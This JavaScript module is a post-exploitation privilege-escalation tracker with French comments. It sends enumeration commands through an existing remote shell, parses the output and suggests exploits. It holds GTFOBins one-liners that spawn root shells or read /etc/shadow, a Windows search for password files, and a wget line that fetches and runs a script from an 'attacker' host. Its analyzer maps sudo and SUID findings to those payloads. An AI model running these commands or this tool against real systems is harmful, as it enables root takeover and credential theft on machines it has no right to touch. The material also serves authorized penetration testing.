// ════════════════════════════════════════════════════════════════
//  🔼 PRIVESC TRACKER — Post-RCE enumeration & privesc suggestions
//  Parse linpeas/pspy/winpeas/LinEnum output + suggestions basees
//  sur kernel/sudo -l/SUID/services/cron/GTFOBins.
// ════════════════════════════════════════════════════════════════
const fs = require('fs');
const path = require('path');

const STORE_DIR = path.join(__dirname, '..', 'data', 'privesc');
try { fs.mkdirSync(STORE_DIR, { recursive: true }); } catch {}

// Commandes a lancer via un shell RCE pour enumerer
const LINUX_ENUM_SCRIPTS = {
    quick: [
        'id',
        'whoami',
        'uname -a',
        'cat /etc/os-release',
        'sudo -l 2>/dev/null || echo NOSUDO',
        'find / -perm -4000 -type f 2>/dev/null',
        'cat /etc/crontab',
        'ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2>/dev/null',
        'cat /etc/passwd | grep -v nologin',
        'ss -tlnp 2>/dev/null || netstat -tlnp',
        'ps auxf',
        'ls -la /tmp /var/tmp /dev/shm 2>/dev/null',
    ],
    kernel_exploits: ['uname -r', 'cat /proc/version'],
    writable_dirs: ['find / -writable -type d 2>/dev/null | head -30', 'find / -writable -path /proc -prune -o -writable -print 2>/dev/null | head -30'],
    docker: ['docker ps 2>/dev/null', 'cat /proc/1/cgroup', 'ls -la /.dockerenv'],
};

const WINDOWS_ENUM_SCRIPTS = {
    quick: [
        'whoami /all',
        'systeminfo',
        'net user',
        'net localgroup administrators',
        'netstat -ano',
        'tasklist /svc',
        'wmic service list brief',
        'accesschk.exe -uwcqv "Authenticated Users" * 2>nul',
        'sc query',
        'dir /s /b "C:\\*pwd*.txt" "C:\\*credentials*.txt" 2>nul',
    ],
};

// GTFOBins curated (subset -> utilise en pair avec sudo -l)
const GTFOBINS = {
    awk: { sudo: "sudo awk 'BEGIN {system(\"/bin/sh\")}'", suid: "awk 'BEGIN {system(\"/bin/sh -p\")}'" },
    bash: { sudo: 'sudo bash', suid: 'bash -p' },
    cp: { sudo: 'LFILE=/etc/shadow; sudo cp $LFILE /tmp/shadow' },
    curl: { suid: 'curl file:///etc/shadow' },
    find: { sudo: 'sudo find . -exec /bin/sh \\; -quit', suid: 'find . -exec /bin/sh -p \\; -quit' },
    less: { sudo: 'sudo less /etc/profile\\n!/bin/sh' },
    more: { sudo: 'TERM= sudo more /etc/profile\\n!/bin/sh' },
    nano: { sudo: 'sudo nano\\nCtrl+R, Ctrl+X, reset; sh 1>&0 2>&0' },
    nmap: { sudo: 'sudo nmap --interactive\\n!sh' },
    perl: { sudo: 'sudo perl -e \'exec "/bin/sh";\'' },
    python: { sudo: 'sudo python -c \'import os;os.system("/bin/sh")\'' },
    python3: { sudo: 'sudo python3 -c \'import os;os.system("/bin/sh")\'' },
    ruby: { sudo: 'sudo ruby -e \'exec "/bin/sh"\'' },
    sed: { sudo: 'sudo sed -n \'1e exec sh 1>&0\' /etc/hosts' },
    sh: { sudo: 'sudo sh' },
    tar: { sudo: 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh' },
    tcpdump: { sudo: 'echo $\'id\\ncat /etc/shadow\' > /tmp/x; chmod +x /tmp/x; sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/x -Z root' },
    vi: { sudo: 'sudo vi -c \':!/bin/sh\' /dev/null' },
    vim: { sudo: 'sudo vim -c \':!/bin/sh\' /dev/null' },
    wget: { suid: 'wget http://attacker/shell.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s' },
};

function getEnumScript(os = 'linux', kind = 'quick') {
    const lib = os === 'windows' ? WINDOWS_ENUM_SCRIPTS : LINUX_ENUM_SCRIPTS;
    const cmds = lib[kind] || lib.quick;
    if (os === 'windows') return cmds.join(' && ');
    return cmds.map(c => `echo "==[${c}]=="; ${c}`).join('; ');
}

// Parse la sortie brute d'une enum et retourne des opportunites
function analyze(output, os = 'linux') {
    const o = String(output);
    const opportunities = [];
    // Sudo entries
    const sudoMatch = o.match(/\(ALL\s*:\s*ALL\)[^\n]*/g);
    if (sudoMatch) {
        for (const line of sudoMatch) {
            opportunities.push({ type: 'sudo', severity: 'critical', detail: line.trim(), exploit: 'sudo -l' });
        }
    }
    // NOPASSWD
    const nopass = o.match(/NOPASSWD:\s*[^\s]+/g);
    if (nopass) {
        for (const line of nopass) {
            const bin = line.replace(/.*NOPASSWD:\s*/, '').trim();
            const gtfo = GTFOBINS[path.basename(bin)];
            opportunities.push({
                type: 'sudo-nopasswd',
                severity: 'critical',
                detail: line,
                binary: bin,
                gtfobins: gtfo?.sudo || null,
            });
        }
    }
    // SUID
    const suidLines = o.split('\n').filter(l => /^-rws/.test(l) || / s[^\s]* \//.test(l));
    for (const l of suidLines) {
        const binMatch = l.match(/\/\S+/);
        if (!binMatch) continue;
        const bin = path.basename(binMatch[0]);
        const gtfo = GTFOBINS[bin];
        if (gtfo?.suid) {
            opportunities.push({ type: 'suid-gtfo', severity: 'high', binary: binMatch[0], gtfobins: gtfo.suid });
        }
    }
    // Kernel version
    const kernelMatch = o.match(/Linux[\s\S]*?(\d+\.\d+\.\d+)/);
    if (kernelMatch) {
        const kv = kernelMatch[1];
        const kmajor = parseInt(kv.split('.')[0], 10);
        const kminor = parseInt(kv.split('.')[1], 10);
        if (kmajor < 4 || (kmajor === 4 && kminor < 10)) {
            opportunities.push({ type: 'kernel-old', severity: 'medium', version: kv, hint: `Verifier CVE kernel < 4.10 (DirtyCow, overlayfs, ...). linux-exploit-suggester.sh recommande.` });
        }
    }
    // Docker env
    if (/docker/i.test(o) && /cgroup/.test(o)) {
        opportunities.push({ type: 'container', severity: 'info', hint: 'Environnement conteneurise detecte. Tester escape docker : /dev/sda readable ? capabilities ?' });
    }
    // Cron
    const cronWritable = o.split('\n').filter(l => /cron/.test(l) && /rwx/.test(l));
    if (cronWritable.length) {
        opportunities.push({ type: 'cron-writable', severity: 'high', detail: cronWritable.slice(0, 5).join(' | ') });
    }
    return opportunities;
}

function saveEnum(host, output, analysis) {
    const key = String(host).replace(/[^a-z0-9.-]/gi, '_').slice(0, 64);
    const stamp = Date.now();
    const p = path.join(STORE_DIR, `${key}-${stamp}.json`);
    fs.writeFileSync(p, JSON.stringify({ host, stamp, output: String(output).slice(0, 50000), analysis }, null, 2));
    return p;
}

module.exports = { getEnumScript, analyze, saveEnum, LINUX_ENUM_SCRIPTS, WINDOWS_ENUM_SCRIPTS, GTFOBINS };
